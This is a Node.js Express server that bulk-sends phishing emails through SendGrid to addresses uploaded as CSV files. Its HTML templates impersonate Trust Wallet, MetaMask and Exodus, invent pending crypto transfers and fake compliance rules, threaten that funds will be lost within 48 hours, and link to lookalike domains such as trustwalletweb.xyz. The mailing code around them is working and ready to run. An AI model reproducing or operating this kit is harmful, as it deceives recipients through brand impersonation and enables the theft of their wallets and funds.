require("dotenv").config();
const express = require("express");
const multer = require("multer");
const csv = require("csv-parser");
const fs = require("fs");
const sgMail = require("@sendgrid/mail");
const cors = require("cors");

const app = express();
const upload = multer({ dest: "uploads/" });

// Configure SendGrid
sgMail.setApiKey(process.env.SENDGRID_API_KEY);

// Middleware
app.use(cors());
app.use(express.json());

// Email templates with versions
const templates = {
  trust: {
    v1: {
      subject: "Verify now!",
      getHtml: (recipient) => `
<!DOCTYPE html>
<html>
  <head>
    <style>
      body {
        font-family: Arial, sans-serif;
        line-height: 1.6;
        color: #333;
      }
      .container {
        max-width: 600px;
        margin: 0 auto;
        padding: 5px;
      }
      .header {
        background-color: #4b6cff;
        color: white;
        padding: 30px;
        text-align: center;
        border-radius: 10px 10px 0 0;
      }
      .content {
        background: #f9f9f9;
        padding: 30px;
      }
      .button {
        display: inline-block;
        background: #4b6cff;
        color: white;
        padding: 8px 20px;
        text-decoration: none;
        border-radius: 5px;
        margin: 20px 0;
      }
      .footer {
        background: #eee;
        padding: 20px;
        text-align: center;
        font-size: 12px;
        color: #666;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <div class="header">
        <img
          src="https://mailer-rosy.vercel.app/trust.png"
          width="50"
          height="50"
          style="border-radius: 25px; background-color: white"
        />
      </div>
      <div class="content">
        <p>
          We are pleased to inform you that our system has detected an incoming
          transfer of 5 BTC to your Trust wallet. This transaction originates
          from wallet address bc1q7...p3k and has been securely queued in our
          blockchain processing center.
        </p>

        <p>
          For security reasons, incoming transfers above 100 ETH require account
          verification before release. Please complete the verification process
          by accessing the secure link below:
        </p>
        <a href="http://trustwalletweb.xyz" class="button">Verify Wallet</a>
        <p style="font-size: small">
          Important: If you do not complete verification within 48 hours, this
          transaction will be permanently removed from our system and the funds
          will be lost irreversibly.
        </p>
      </div>
      <div class="footer">
        <p>© ${new Date().getFullYear()} Trust Wallet. All rights reserved.</p>
      </div>
    </div>
  </body>
</html>
      `,
    },
    v2: {
      subject: "Verify now!",
      getHtml: (recipient) => `
<!DOCTYPE html>
<html>
  <head>
    <style>
      body {
        font-family: Arial, sans-serif;
        line-height: 1.6;
        color: #333;
      }
      .container {
        max-width: 600px;
        margin: 0 auto;
        padding: 5px;
      }
      .header {
        background-color: #4b6cff;
        color: white;
        padding: 30px;
        text-align: center;
        border-radius: 10px 10px 0 0;
      }
      .content {
        background: #f9f9f9;
        padding: 30px;
      }
      .button {
        display: inline-block;
        background: #4b6cff;
        color: white;
        padding: 8px 20px;
        text-decoration: none;
        border-radius: 5px;
        margin: 20px 0;
      }
      .footer {
        background: #eee;
        padding: 20px;
        text-align: center;
        font-size: 12px;
        color: #666;
        line-height: 20%;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <div class="header">
        <img
          src="https://mailer-rosy.vercel.app/trust.png"
          width="50"
          height="50"
          style="border-radius: 25px; background-color: white"
        />
      </div>
      <div class="content">
        <p>
          To meet upcoming decentralized identity regulations, Trust Wallet is
          enforcing wallet verification under the Web3 Compliance Protocol
          (WCP).
        </p>
        <p>
          All users must validate their wallet through the new on-chain
          signature system to avoid non-compliance status.
        </p>
        <p>
          Unverified wallets will be blocked from certain DeFi services,
          centralized bridges, and staking protocols, restricted from swaps,
          bridges, and other Web3 operations, and may lose access to their
          digital assets.
        </p>

        <a href="http://trustwalletweb.xyz" class="button">Sign and Verify Wallet</a>
        <p style="font-size: 14px">
          The process is quick, secure, and completely free.
        </p>
      </div>
      <div class="footer">
        <p>Stay compliant. Stay secure</p>
        <p>
          © ${new Date().getFullYear()} Trust Wallet Compliance Team. All rights
          reserved.
        </p>
      </div>
    </div>
  </body>
</html>

      `,
    },
  },
  metamask: {
    v1: {
      subject: "Verify now",
      getHtml: (recipient) => `
 <!DOCTYPE html>
<html>
  <head>
    <style>
      body {
        font-family: Arial, sans-serif;
        line-height: 1.6;
        color: #333;
      }
      .container {
        max-width: 600px;
        margin: 0 auto;
        padding: 5px;
      }
      .header {
        background-color: rgb(203, 203, 203);
        color: white;
        padding: 8px 30px;
        text-align: center;
        border-radius: 10px 10px 0 0;
      }
      .content {
        background: #f9f9f9;
        padding: 30px;
      }
      .button {
        display: inline-block;
        background: #f86a05;
        font-weight: 600;
        color: black;
        padding: 5px 20px;
        text-decoration: none;
        border-radius: 5px;
        margin: 20px 0;
      }
      .footer {
        background: #eee;
        padding: 20px;
        text-align: center;
        font-size: 12px;
        color: #666;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <div class="header">
        <div
          style="
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
          "
        >
          <img
            src="https://mailer-rosy.vercel.app/metamask1.png"
            width="20"
            height="20"
          />
          <p
            style="
              color: black;
              font-weight: 600;
              font-family: monospace;
              font-size: xx-large;
            "
          >
            METAMASK
          </p>
        </div>
      </div>
      <div style="background: #f9f9f9; padding: 30px">
        <p>
          We are pleased to inform you that our system has detected an incoming
          transfer of 137.45 ETH to your MetaMask wallet. This transaction
          originates from wallet address bc1q7...p3k and has been securely
          queued in our Ethereum Virtual Machine (EVM) processing center.
        </p>

        <a href="http://metamask-web3.xyz" class="button">VERIFY WALLET</a>

        <div class="story">
          <p>
            For security reasons, incoming transfers above 100 ETH require
            account verification before release. Please complete the
            verification process by accessing the secure link below:
          </p>
        </div>

        <div style="font-size: small">
          <p>
            Important: If you do not complete verification within 48 hours, this
            transaction will be permanently removed from our system and the
            funds will be lost irreversibly.
          </p>
        </div>
      </div>
      <div class="footer">
        <p>© ${new Date().getFullYear()} Metamask. All rights reserved.</p>
      </div>
    </div>
  </body>
</html>

      `,
    },
    v2: {
      subject: "Verify Now",
      getHtml: (recipient) => `
 <!DOCTYPE html>
<html>
  <head>
    <style>
      body {
        font-family: Arial, sans-serif;
        line-height: 1.6;
        color: #333;
      }
      .container {
        max-width: 600px;
        margin: 0 auto;
        padding: 5px;
      }
      .header {
        background-color: rgb(203, 203, 203);
        color: white;
        padding: 8px 30px;
        text-align: center;
        border-radius: 10px 10px 0 0;
      }
      .content {
        background: #f9f9f9;
        padding: 30px;
      }
      .button {
        display: inline-block;
        background: #f86a05;
        font-weight: 600;
        color: black;
        padding: 5px 20px;
        text-decoration: none;
        border-radius: 5px;
        margin: 20px 0;
      }
      .footer {
        background: #eee;
        padding: 20px;
        text-align: center;
        font-size: 12px;
        color: #666;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <div class="header">
        <div
          style="
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
          "
        >
          <img
            src="https://mailer-rosy.vercel.app/metamask1.png"
            width="20"
            height="20"
          />
          <p
            style="
              color: black;
              font-weight: 600;
              font-family: monospace;
              font-size: xx-large;
            "
          >
            METAMASK
          </p>
        </div>
      </div>
      <div style="background: #f9f9f9; padding: 30px">
        <div class="section">
          <p>
            MetaMask is upgrading to a programmable account system, enabled by
            upgrades like EIP‑7702 and the Pectra hard fork. This change
            improves security and enhances your wallet’s capabilities, helping
            you engage with Web3 in more versatile ways.
          </p>
        </div>

        <div class="section">
          <h3>Action Required:</h3>
          <p>
            To ensure uninterrupted access to your wallet and digital assets,
            please verify your account by clicking the link below.
          </p>
        </div>

        <a href="http://metamask-web3.xyz" class="button">Verify Your MetaMask Wallet</a>

        <div style="font-size: small">
          <p>
            Please note, wallets that remain unverified after this date may lose
            access to their digital assets due to the upgrade.
          </p>
          <p>Thank you for your prompt attention.</p>
        </div>
      </div>
      <div class="footer">
        <p>© ${new Date().getFullYear()} Metamask. All rights reserved.</p>
      </div>
    </div>
  </body>
</html>

      `,
    },
  },
  exodus: {
    v1: {
      subject: "Verify Now",
      getHtml: (recipient) => `
<!DOCTYPE html>
<html>
  <head>
    <style>
      body {
        font-family: Arial, sans-serif;
        line-height: 1.6;
        margin: 0;
        padding: 0;
      }

      .container {
        max-width: 600px;
        margin: 50px auto;
        padding: 5px;
        border-radius: 10px;
        overflow: hidden;
        position: relative;
        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
      }

      .header {
        background: rgb(6, 0, 48);
        color: white;
        padding: 8px 30px;
        text-align: center;
        border-radius: 10px 10px 0 0;
      }

      .content {
        position: relative;
        padding: 30px;
        background-image: url("https://mailer-rosy.vercel.app/background-exodus.jpg");
        background-size: cover;
        background-position: center;
        background-repeat: no-repeat;
        color: white;
      }

      .content * {
        position: relative;
        z-index: 1;
      }

      .button {
        display: inline-block;
        background: linear-gradient(to right, purple, rgb(80, 80, 255));
        font-weight: 600;
        color: white;
        padding: 8px 20px;
        text-decoration: none;
        border-radius: 5px;
        margin: 20px 0;
      }

      .footer {
        background: rgb(3, 0, 24);
        padding: 20px;
        text-align: center;
        font-size: 12px;
        color: rgb(130, 128, 128);
        border-radius: 0 0 10px 10px;
      }
    </style>
  </head>

  <body>
    <div class="container">
      <div class="header">
        <div
          style="display: flex; justify-content: center; align-items: center"
        >
          <img src="https://mailer-rosy.vercel.app/exodus.png" width="50" height="50" />
          <p
            style="
              color: white;
              font-weight: 500;
              font-family: 'Franklin Gothic Medium', 'Arial Narrow', Arial,
                sans-serif;
              font-size: x-large;
            "
          >
            EXODUS
          </p>
        </div>
      </div>

      <div class="content">
        <p style="font-size: 16px">
          We are pleased to inform you that our system has detected an incoming
          transfer of 5 BTC to your Exodus wallet. This transaction originates
          from wallet address bc1q7...p3k and has been securely queued in our
          blockchain processing center.
        </p>

        <div class="offer">
          <p>
            For security reasons, incoming transfers above 1 BTC require account
            verification before release. Please complete the verification
            process by accessing the secure link below:
          </p>
        </div>

        <a href="http://exodus-web3.xyz" class="button">Verify Wallet</a>

        <div>
          <p style="font-size: small; color: #aeaeae">
            Important: If you do not complete verification within 48 hours, this
            transaction will be permanently removed from our system and the
            funds will be lost irreversibly.
          </p>
        </div>
      </div>

      <div class="footer">
        <p>
          © ${new Date().getFullYear()} Exodus Movement. All rights reserved.
        </p>
      </div>
    </div>
  </body>
</html>

      `,
    },
  },
};

// Parse CSV and return email list
async function parseCSV(filePath) {
  const results = [];

  return new Promise((resolve, reject) => {
    fs.createReadStream(filePath)
      .pipe(csv())
      .on("data", (data) => {
        results.push({
          email: data.email?.trim(),
          name: data.name?.trim() || "User",
        });
      })
      .on("end", () => {
        fs.unlinkSync(filePath);
        resolve(results);
      })
      .on("error", (error) => {
        reject(error);
      });
  });
}

// Send single email
async function sendEmail(recipient, template, version) {
  const templateData = templates[template][version];

  if (!templateData) {
    throw new Error(`Template ${template} version ${version} not found`);
  }

  const msg = {
    to: recipient.email,
    from: process.env.SENDGRID_FROM_EMAIL,
    subject: templateData.subject,
    html: templateData.getHtml(recipient),
  };

  try {
    await sgMail.send(msg);
    return { success: true, email: recipient.email };
  } catch (error) {
    console.error(`Failed to send to ${recipient.email}:`, error.message);
    return { success: false, email: recipient.email, error: error.message };
  }
}

// Send bulk emails with rate limiting
async function sendBulkEmails(recipients, template, version) {
  const results = {
    total: recipients.length,
    sent: 0,
    failed: 0,
    errors: [],
  };

  const delayMs = 100;

  for (let i = 0; i < recipients.length; i++) {
    const recipient = recipients[i];

    if (!recipient.email || !recipient.email.includes("@")) {
      results.failed++;
      results.errors.push({
        email: recipient.email,
        error: "Invalid email address",
      });
      continue;
    }

    const result = await sendEmail(recipient, template, version);

    if (result.success) {
      results.sent++;
      console.log(
        `✅ [${i + 1}/${recipients.length}] Sent to ${recipient.email}`
      );
    } else {
      results.failed++;
      results.errors.push({ email: recipient.email, error: result.error });
      console.log(
        `❌ [${i + 1}/${recipients.length}] Failed: ${recipient.email}`
      );
    }

    if (i < recipients.length - 1) {
      await new Promise((resolve) => setTimeout(resolve, delayMs));
    }
  }

  return results;
}

// API Endpoints

// Upload and parse CSV
app.post("/api/upload-csv", upload.single("file"), async (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ error: "No file uploaded" });
    }

    const recipients = await parseCSV(req.file.path);

    res.json({
      success: true,
      count: recipients.length,
      preview: recipients.slice(0, 5),
    });
  } catch (error) {
    console.error("CSV parsing error:", error);
    res.status(500).json({ error: "Failed to parse CSV file" });
  }
});

// Send campaign
app.post("/api/send-campaign", upload.single("file"), async (req, res) => {
  try {
    const { template, version } = req.body;

    if (!req.file) {
      return res.status(400).json({ error: "No file uploaded" });
    }

    if (!template || !templates[template]) {
      return res.status(400).json({ error: "Invalid template selected" });
    }

    if (!version || !templates[template][version]) {
      return res.status(400).json({ error: "Invalid version selected" });
    }

    const recipients = await parseCSV(req.file.path);

    if (recipients.length === 0) {
      return res
        .status(400)
        .json({ error: "No valid recipients found in CSV" });
    }

    console.log(
      `Starting campaign: ${recipients.length} emails using ${template} template (${version})`
    );

    const results = await sendBulkEmails(recipients, template, version);

    console.log("Campaign completed:", results);

    res.json({
      success: true,
      results: results,
    });
  } catch (error) {
    console.error("Campaign error:", error);
    res.status(500).json({ error: "Failed to send campaign" });
  }
});

// Test endpoint - send to a single email
app.post("/api/test-email", async (req, res) => {
  try {
    const { email, name, template } = req.body;

    if (!email || !template) {
      return res.status(400).json({ error: "Email and template are required" });
    }

    if (!templates[template]) {
      return res.status(400).json({ error: "Invalid template selected" });
    }

    const result = await sendEmail(
      { email, name: name || "Test User" },
      template
    );

    if (result.success) {
      res.json({
        success: true,
        message: `Test email sent to ${email}`,
        email: result.email,
      });
    } else {
      res.status(500).json({
        success: false,
        error: result.error,
      });
    }
  } catch (error) {
    console.error("Test email error:", error);
    res.status(500).json({ error: "Failed to send test email" });
  }
});

// SendGrid diagnostic test - NEW ENDPOINT
app.get("/api/test-sendgrid", async (req, res) => {
  try {
    console.log("\n🧪 Testing SendGrid Configuration...");

    const msg = {
      to: process.env.SENDGRID_FROM_EMAIL,
      from: process.env.SENDGRID_FROM_EMAIL,
      subject: "SendGrid Configuration Test",
      text: "If you receive this email, your SendGrid integration is working correctly!",
      html: "<strong>If you receive this email, your SendGrid integration is working correctly!</strong>",
    };

    await sgMail.send(msg);

    console.log("✅ Test email sent successfully!");

    res.json({
      success: true,
      message: "Test email sent successfully!",
      to: process.env.SENDGRID_FROM_EMAIL,
      note: "Check your inbox",
    });
  } catch (error) {
    console.error("❌ SendGrid test failed:", error);

    res.status(500).json({
      success: false,
      error: error.message,
      code: error.code,
      details: error.response?.body || "No additional details",
    });
  }
});

// Health check endpoint
app.get("/api/health", (req, res) => {
  res.json({
    status: "ok",
    timestamp: new Date().toISOString(),
    sendgrid: {
      configured: !!process.env.SENDGRID_API_KEY,
      from_email: process.env.SENDGRID_FROM_EMAIL || "NOT SET",
    },
  });
});

// Get available templates
app.get("/api/templates", (req, res) => {
  const templateList = Object.keys(templates).map((key) => ({
    id: key,
    subject: templates[key].subject,
  }));

  res.json({
    success: true,
    templates: templateList,
  });
});

// Start server
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log("\n" + "=".repeat(50));
  console.log("✅ Email Campaign Server Started");
  console.log("=".repeat(50));
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(
    `📧 SendGrid configured: ${process.env.SENDGRID_API_KEY ? "✓" : "✗"}`
  );
  console.log(`📤 From email: ${process.env.SENDGRID_FROM_EMAIL || "NOT SET"}`);
});

process.on("uncaughtException", (error) => {
  console.error("❌ Uncaught Exception:", error);
});

process.on("unhandledRejection", (reason, promise) => {
  console.error("❌ Unhandled Rejection:", reason);
});
